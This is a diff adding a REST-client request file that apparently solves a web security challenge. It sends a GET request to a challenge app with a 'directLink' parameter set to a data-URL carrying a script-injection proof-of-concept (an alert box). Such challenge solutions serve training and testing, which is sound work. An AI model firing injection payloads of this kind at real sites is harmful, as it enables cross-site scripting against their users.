@@ -1,0 +1,7 @@
+@url = https://chal51-diou6.vercel.app/
+@payload = data:text/html,<script>alert('Wizer')</script>
+
+GET {{url}}?directLink={{payload}} HTTP/1.1
+Content-Type: application/json
+
+###
